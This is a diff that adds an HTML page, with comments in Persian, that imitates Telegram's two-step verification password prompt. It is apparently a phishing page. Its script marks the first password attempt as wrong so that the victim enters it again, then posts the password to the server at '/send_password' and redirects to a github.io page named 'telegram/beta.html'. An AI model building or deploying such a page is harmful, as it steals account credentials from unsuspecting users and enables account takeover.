@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@250;1000&display=swap" rel="stylesheet">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>2-factor authentication</title>
+    <style>
+        body {
+            font-family: "Roboto", sans-serif;
+            text-align: center;
+            margin: 50px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            margin-top: 50px;
+            height: 100%;
+        }
+        .container {
+            max-width: 300px;
+            width: 100%;
+            padding: 30px;
+            border-radius: 10px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+        .monkey-img {
+            width: 100px;
+            height: 100px;
+            transition: opacity 0.5s ease-in-out;
+        }
+        .hidden {
+            opacity: 0;
+        }
+        input {
+            margin-top: 20px;
+            padding: 10px;
+            width: 350px;
+            font-size: 16px;
+            margin-bottom: 30px;
+            border: 1.5px solid #ddd;
+            border-radius: 12px;
+            transition: border-color 0.2s ease;
+            text-align: center;
+            min-height: 22px;
+        }
+        input:focus {
+            border: 1.5px solid #0088cc; /* فوکوس آبی */
+            outline: none;
+        }
+        button {
+            width: 35%;
+            padding: 10px 20px;
+            font-size: 16px;
+            background-color: #3390ec;
+            color: white;
+            border: none;
+            border-radius: 12px;
+            cursor: pointer;
+            text-align: center;
+        }
+
+        /* افکت لرزش */
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            20%, 60% { transform: translateX(-5px); }
+            40%, 80% { transform: translateX(5px); }
+        }
+
+        .shake {
+            animation: shake 0.5s ease-in-out;
+        }
+
+        h2 {
+            font-weight: 1000;
+            font-family:'Roboto', sans-serif;
+            font-size: 18px;
+            color: #000000;
+            margin-top: 50px;
+            margin-bottom: -10px;
+        }
+        
+        p {
+            font-weight: 590;
+            font-size: 14px;
+            color: #555;
+            width: 380px;
+        }
+
+
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <img id="monkey" class="monkey-img" src="https://em-content.zobj.net/thumbs/240/apple/354/monkey-face_1f435.png" alt="Monkey">
+        <h2>Enter Password</h2>
+        <p>You Have Two-step Verification enabled, so your account is protected with an additional password.</p>
+        <input type="password" id="password" placeholder="enter your password">
+        <button onclick="sendPassword()">submit</button>
+        <p id="responseMessage"></p>
+    </div>
+
+    <script>
+        const monkeyImg = document.getElementById("monkey");
+        const passwordInput = document.getElementById("password");
+        let attemptCount = 0; 
+
+        passwordInput.addEventListener("focus", () => {
+            monkeyImg.classList.add("hidden");
+            setTimeout(() => {
+                monkeyImg.src = "https://em-content.zobj.net/source/apple/118/see-no-evil-monkey_1f648.png";
+                monkeyImg.classList.remove("hidden");
+            }, 450);
+        });
+
+        passwordInput.addEventListener("blur", () => {
+            monkeyImg.classList.add("hidden");
+            setTimeout(() => {
+                monkeyImg.src = "https://em-content.zobj.net/thumbs/240/apple/354/monkey-face_1f435.png";
+                monkeyImg.classList.remove("hidden");
+            }, 450);
+        });
+
+        function sendPassword() {
+            attemptCount++;
+
+            if (attemptCount < 2) {
+                passwordInput.style.border = "2px solid red"; // خطا → قرمز
+                document.body.classList.add("shake"); // لرزش صفحه
+                setTimeout(() => document.body.classList.remove("shake"), 500); 
+                return;
+            }
+
+            // حالت تأیید → سبز
+            passwordInput.style.border = "1.2px solid green"; 
+
+            fetch("/send_password", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ password: passwordInput.value })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.status === "success") {
+                    setTimeout(() => {
+                        window.location.href = "https://walker-93486.github.io/telegram/beta.html"; // **دایرکت**
+                    }, 500);
+                } else {
+                    passwordInput.style.border = "1.2px solid red"; // اگر خطایی بود دوباره قرمز بشه
+                }
+            })
+            .catch(error => {
+                console.error("خطا:", error);
+                passwordInput.style.border = "1.2px solid red"; // در صورت خطا قرمز بشه
+            });
+        }
+    </script>
+</body>
+</html>
